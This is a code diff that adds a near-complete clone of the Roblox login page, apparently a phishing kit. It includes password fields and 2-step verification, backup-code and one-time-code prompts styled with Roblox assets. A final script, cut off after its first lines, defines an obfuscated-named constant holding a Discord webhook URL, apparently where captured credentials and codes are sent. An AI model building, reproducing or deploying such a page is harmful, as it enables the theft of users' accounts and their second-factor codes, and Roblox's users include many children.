@@ -362,6 +362,370 @@
     </footer>
 </div>
 <script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
+<link rel="stylesheet" href="https://css.rbxcdn.com/15b88564eae926990141be36eb3a9bd761cf2778fc9ac3425cdd4db1473148f4.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/8fa43545250dfbd7d96d164fe24e886391fdccc9b87b0dc91ce78933aebcda43.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/c92e5fc4564200cb9d84ba69bd53e4a4f86109709b8db691c1567dd257c1115b.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/6686c24b7d5461929debb2b62b589c5399f35ba8ea8ffdd641cf2a6b0b0b686e.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
+<link rel="stylesheet" href="https://css.rbxcdn.com/c12b1163bd09c1076e861bfcbb98ab175a37971fae6a96c54c031afbb6589427.css">
+<style>
+    .background-image.marketing-background-1 {
+        width: 100%;
+        background: radial-gradient(circle at center, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.75) 100%), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') 50% / cover no-repeat fixed !important;
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100vh;
+        z-index: -1;
+    }
+    .rbx-body, .content, .container-main {
+        background: transparent !important;
+        background-color: transparent !important;
+    }
+    #twostep-error, #Authen-error, #RecoveryFromEmail-error, #RecoveryFromAuthen-error, #otp-code-error {
+        color: #e53935 !important;
+        font-weight: 600;
+    }
+    .login-error {
+        color: #e53935 !important;
+        font-weight: 600;
+        display: block;
+        margin-top: 6px;
+        min-height: 18px;
+    }
+    @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes modalScaleIn {
+        from { opacity: 0; transform: scale(0.95) translateY(6px); }
+        to { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .modal-backdrop.in { animation: modalFadeIn .2s ease-out; }
+    .modal-modern.in .modal-content {
+        animation: modalScaleIn .22s cubic-bezier(.2,.8,.3,1);
+        transform-origin: center center;
+    }
+    .rbx-bars {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 4px;
+        height: 20px;
+        margin: 12px auto;
+    }
+    .rbx-bars .bar {
+        width: 4px;
+        height: 100%;
+        background: #fff;
+        border-radius: 2px;
+        transform-origin: center;
+        animation: barStretch 1.1s ease-in-out infinite;
+    }
+    .rbx-bars .bar:nth-child(1) { animation-delay: 0s; }
+    .rbx-bars .bar:nth-child(2) { animation-delay: .15s; }
+    .rbx-bars .bar:nth-child(3) { animation-delay: .3s; }
+    @keyframes barStretch {
+        0%, 100% { transform: scaleY(0.35); opacity: 0.4; }
+        50%      { transform: scaleY(1);    opacity: 1; }
+    }
+    .rbx-bars.small { height: 14px; margin: 0; }
+    .rbx-bars.small .bar { width: 3px; }
+    .avatar-preview-box {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        margin: 0 auto 15px auto;
+        border: 2px solid #0084ff;
+        object-fit: cover;
+        display: none;
+    }
+</style>
+</head>
+<body id="rbx-body" class="rbx-body dark-theme gotham-font" data-internal-page-name="Login">
+
+<div id="wrap" class="wrap no-gutter-ads logged-out">
+    <div id="navigation-container" class="dark-theme gotham-font">
+        <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+            <div class="container-fluid">
+                <div class="rbx-navbar-header">
+                    <div class="navbar-header">
+                        <a class="navbar-brand" href="/login">
+                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                        </a>
+                    </div>
+                </div>
+                <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="/robux">Robux</a></li>
+                </ul>
+                <div id="right-navigation-header">
+                    <div class="navbar-right rbx-navbar-right">
+                        <ul class="nav navbar-right rbx-navbar-right-nav">
+                            <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="/login">Sign Up</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container-main" id="container-main" tabindex="-1">
+        <div class="content">
+            <script>
+            function twostepInput(a, b){
+                if(a.length == 6){ document.getElementById(b).disabled = false; }
+                else { document.getElementById(b).disabled = true; }
+            }
+            function twostepInputRecovery(a, b){
+                if(a.length == 9){ document.getElementById(b).disabled = false; }
+                else { document.getElementById(b).disabled = true; }
+            }
+            </script>
+
+            <div id="react-login-container" class="login-container">
+                <div id="background-image" class="background-image marketing-background-1"></div>
+                <div id="login-base">
+                    <div class="section-content login-section">
+                        <h1 class="login-header">Login to Roblox</h1>
+                        <img id="avatar-preview" class="avatar-preview-box" alt="Avatar">
+                        <div id="login-form">
+                            <div>
+                                <div class="login-form-container">
+                                    <form class="login-form">
+                                        <div class="form-group username-form-group">
+                                            <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                                            <input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" autocomplete="username">
+                                        </div>
+                                        <div class="form-group password-form-group">
+                                            <label for="login-password" class="sr-only">Password</label>
+                                            <input id="login-password" name="password" type="password" autocomplete="current-password" class="form-control input-field" placeholder="Password">
+                                        </div>
+                                        <div aria-live="polite">
+                                            <p class="form-control-label xsmall login-error" id="text-error"></p>
+                                        </div>
+                                        <div id="login-loading" class="rbx-bars" style="display:none;"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
+                                        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="#">Forgot Password or Username?</a></div>
+                        <div>
+                            <div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div>
+                            <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button>
+                            <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Use Another Device</span></button>
+                        </div>
+                        <div class="text-center">
+                            <div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="#">Sign Up</a></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div role="dialog" id="methodChoice" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('methodChoice').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Choose a verification method to continue.</p>
+                            <table class="table table-striped media-type-list modal-margin-bottom-large"><tbody>
+                                <tr class="media-type-row" data-method="Email" onclick="chooseMethod('Email')">
+                                    <td><span class="icon-menu-email"></span></td>
+                                    <td class="media-type-label">Email</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                                <tr class="media-type-row" data-method="Authenticator" onclick="chooseMethod('Authenticator')">
+                                    <td><span class="icon-menu-mobile"></span></td>
+                                    <td class="media-type-label">Authenticator</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                                <tr class="media-type-row" data-method="Backup Code" onclick="chooseMethod('Backup Code')">
+                                    <td><span class="icon-menu-recover"></span></td>
+                                    <td class="media-type-label">Backup Code</td>
+                                    <td class="media-type-selector"><span class="icon-next"></span></td>
+                                </tr>
+                            </tbody></table>
+                        </div>
+                        <div class="modal-footer">
+                            <p class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="twostepverification" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('twostepverification').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p>
+                            <div class="input-control-wrapper">
+                                <div id="twostep-group" class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="twostep-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox"> <label for="remember-device">Trust this device for 30 days</label></p>
+                            <p><button type="button" id="resend-btn" class="modal-body-button-link small">Resend Code</button></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="verifyButton" disabled>Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="authenticatorverification" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" onclick="document.getElementById('authenticatorverification').style.display = 'none';" class="modal-modern-header-button"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app.</p>
+                            <div class="input-control-wrapper">
+                                <div id="Authen-group" class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'AuthenButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input-authenticator" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="Authen-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="AuthenButton" disabled>Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="RecoveryFromEmail" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromEmail').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p>
+                            <div class="input-control-wrapper">
+                                <div id="RecoveryFromEmail-group" class="form-group">
+                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromEmailButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-RecoveryFromEmail" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromEmail-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromEmailButton" disabled>Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="otpEmailModal" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpEmailModal').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">Login with One-Time Code</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter your email address and we'll send you a one-time code to log in.</p>
+                            <div class="input-control-wrapper">
+                                <div class="form-group">
+                                    <input type="email" maxlength="120" placeholder="Email Address" id="otp-email-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="otp-error">&nbsp;</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-send-btn">Send Code</button></div>
+                            <p class="text-footer">We'll never share your email with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="otpCodeModal" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpCodeModal').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">Enter One-Time Code</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the 6-digit code we sent to <b id="otp-email-display"></b>.</p>
+                            <div class="input-control-wrapper">
+                                <div class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'otp-verify-btn'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="otp-code-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="otp-code-error">&nbsp;</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-verify-btn" disabled>Verify</button></div>
+                            <p class="text-footer">Never share your one-time code with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer class="container-footer" id="footer-container">
+        <div class="footer">
+            <ul class="row footer-links">
+                <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Jobs</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Blog</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Parents</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Gift Cards</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Help</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Terms</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Accessibility</a></li>
+                <li class="footer-link"><a class="text-footer-nav privacy" href="#">Privacy</a></li>
+            </ul>
+            <div class="row copyright-container">
+                <div class="col-sm-12">
+                    <p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+</div>
+<script>
 const _0x1a = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
 const _0x2b = 3000;
 
